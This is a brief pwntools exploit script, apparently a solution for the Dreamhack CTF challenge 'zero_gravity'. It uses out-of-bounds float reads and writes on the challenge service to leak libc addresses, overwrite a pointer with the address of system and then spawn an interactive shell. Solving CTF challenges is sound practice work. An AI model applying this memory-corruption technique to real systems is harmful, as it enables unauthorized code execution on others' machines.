from pwn import *
import struct

# p = process("./zero_gravity")
p = remote("host3.dreamhack.games", 23802)
e = ELF("./zero_gravity")
# libc = e.libc
libc = ELF("./libc.so.6")

def read(index):
    p.sendlineafter(">>", "r")
    p.sendlineafter(">>", str(index))
    return float(p.recvline())

def add(index, value):
    p.sendlineafter(">>", "a")
    p.sendlineafter(">>", str(index))
    p.sendlineafter(">>", str(value))

f2u = lambda x: u32(struct.pack("<f", x))
u2f = lambda x: struct.unpack("<f", p32(x))[0]

add(16, u2f(0x41414141))

libc_base = (f2u(read(-25)) << 32) | f2u(read(-26)) - libc.sym["__isoc99_scanf"]
print(hex(libc.sym["system"]))

leak = f2u(read(-30))
add(-30, u2f((libc_base + libc.sym["system"]) & 0xFFFFFFFF) - u2f(leak))

p.sendlineafter(">>", "sh")

p.interactive()